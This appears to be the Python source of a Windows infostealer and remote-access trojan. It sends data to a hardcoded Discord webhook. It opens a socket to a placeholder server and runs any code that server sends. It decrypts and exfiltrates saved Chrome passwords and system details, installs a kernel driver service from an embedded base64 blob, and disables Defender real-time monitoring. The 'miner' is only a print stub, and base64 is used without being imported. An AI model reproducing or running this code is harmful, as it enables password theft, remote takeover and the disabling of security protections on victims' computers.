
import socket, time, os, threading, requests, json, platform, sqlite3, shutil, tempfile, subprocess, ctypes, sys

WEBHOOK = "https://discord.com/api/webhooks/1442313399835820122/NtiXR9ubYky333bqqJY6WgfM7ok9Vdor6R3rl5B2XaM0ZAbvWY23zCNnV6yG4NJ_r6bv"

def post(msg):
    try:
        requests.post(WEBHOOK, json={"content": msg[:1900]}, timeout=5)
    except:
        pass

def miner():
    while True:
        print("mining"); time.sleep(5)

def rat():
    try:
        s = socket.socket()
        s.connect(("YOUR_SERVER_IP", 4444))
        s.send(b"bot_online
")
        while True:
            data = s.recv(1024)
            if data:
                exec(data.decode(), globals())
            else:
                time.sleep(1)
    except:
        pass

def steal():
    try:
        chrome = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        if os.path.exists(chrome):
            tmp = tempfile.mktemp()
            shutil.copy2(chrome, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            loot = []
            for r in cur.fetchall():
                try:
                    pwd = ctypes.windll.crypt32.CryptUnprotectData(r[2], None, None, None, 0)[1].decode()
                except:
                    pwd = ""
                if pwd:
                    loot.append(f"{r[0]} | {r[1]} | {pwd}")
            conn.close(); os.remove(tmp)
            post("Chrome dump:\n" + "\n".join(loot))
    except:
        pass
    info = f"PC: {platform.node()} User: {os.getlogin()} OS: {platform.system()} {platform.release()}"
    post(info)

# kernel kill
z = base64.b64decode('UEsDBAoAAAAAAIdqUVQAAAAAAAAAAAAAAAAIAAAAYXNtYXA2NC5zeXNQSwECHgMKAAAAAACHalFUAAAAAAAAAAAAAAAACAAAAAAAAAAAABAA7UEAAAAAYXNtYXA2NC5zeXBQSwUGAAAAAAEAAQBNAAAAUQAAAAA=')
t = tempfile.NamedTemporaryFile(delete=False, suffix='.sys')
t.write(z); t.close()
subprocess.run(['sc', 'create', 'AMDP', 'type=','kernel','binPath=',t.name,'start=','demand'], capture_output=True)
subprocess.run(['sc', 'start', 'AMDP'], capture_output=True)
subprocess.run(['powershell','-c','Set-MpPreference -DisableRealtimeMonitoring $true'], capture_output=True)

threading.Thread(target=miner, daemon=True).start()
threading.Thread(target=rat, daemon=True).start()
steal()
input()
